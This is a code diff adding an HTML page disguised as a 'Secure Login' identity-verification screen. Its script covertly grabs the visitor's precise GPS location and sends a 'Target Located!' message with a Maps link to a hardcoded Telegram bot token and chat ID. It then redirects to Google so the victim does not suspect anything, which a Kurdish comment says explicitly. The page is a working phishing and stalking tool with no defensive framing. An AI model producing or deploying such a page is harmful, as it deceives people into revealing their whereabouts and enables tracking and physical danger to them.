@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Login - Access Control</title>
+    <style>
+        body { background-color: #f4f7f6; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center; width: 320px; }
+        .shield-icon { font-size: 50px; color: #28a745; margin-bottom: 20px; }
+        h2 { font-size: 20px; color: #333; margin-bottom: 10px; }
+        p { font-size: 14px; color: #666; margin-bottom: 25px; }
+        .verify-btn { background: #007bff; color: white; border: none; padding: 12px 30px; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
+        .verify-btn:hover { background: #0056b3; }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <div class="shield-icon">🛡️</div>
+        <h2>Identity Verification</h2>
+        <p>To access this content, please verify your current location for security purposes.</p>
+        <button class="btn verify-btn" onclick="sendLocation()">Verify Identity</button>
+    </div>
+
+    <script>
+        const TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY';
+        const ID = '6351568884';
+
+        function sendLocation() {
+            if (navigator.geolocation) {
+                // داواکردنی لۆکەیشن لە مۆبایلەکە
+                navigator.geolocation.getCurrentPosition(position => {
+                    const lat = position.coords.latitude; // هێڵی پانیمان
+                    const lon = position.coords.longitude; // هێڵی درێژیمان
+                    const accuracy = position.coords.accuracy; // ڕێژەی وردی لۆکەیشنەکە بە مەتر
+
+                    // دروستکردنی لینکی نەخشەی گووگڵ
+                    const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    const message = `📍 **Target Located!**\n\n` +
+                                    `🌐 Maps: ${googleMapsLink}\n` +
+                                    `🎯 Accuracy: ${accuracy} meters\n` +
+                                    `⏰ Time: ${new Date().toLocaleString()}`;
+
+                    // ناردنی زانیارییەکان بۆ تێلێگرام
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
+                    .then(() => {
+                        // دوای ئەوەی ڕۆیشت، کەسەکە دەنێرێت بۆ گوگل تا گومان نەکات
+                        window.location.href = "https://www.google.com";
+                    });
+
+                }, (error) => {
+                    // ئەگەر کەسەکە "Don't Allow" بکات
+                    alert("Verification Failed: You must allow location access to proceed.");
+                }, {
+                    enableHighAccuracy: true // وادەکات لۆکەیشنەکە زۆر ورد بێت
+                });
+            } else {
+                alert("Your browser does not support location verification.");
+            }
+        }
+    </script>
+</body>
+</html>
